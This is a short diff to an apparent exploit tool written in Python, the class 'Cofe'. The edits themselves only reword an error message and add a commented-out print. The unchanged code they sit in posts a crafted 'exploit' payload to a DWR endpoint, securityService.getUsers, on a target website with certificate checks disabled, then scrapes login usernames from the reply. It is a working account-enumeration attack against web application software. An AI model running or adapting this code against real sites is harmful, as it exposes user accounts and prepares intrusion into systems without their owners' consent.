@@ -53,7 +53,7 @@ class Cofe:
                     exit()
         except Exception as e:
             print(e)
-            print("[-] Critical website is down ! \n")
+            print("[-] Critical website is down OR you not provide a vile schema from URL ex: http://wwww.foo.com \n")
             exit()
 
 
@@ -117,6 +117,7 @@ class Cofe:
         exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
         "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
         r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
+        #print(r.text)
         if "200" in str(r) and not "404" in r.text:
             print(vulnerable("[+] Getting Possible login users... \n"))
             for m in re.findall(r'name="(\w*)"', r.text):
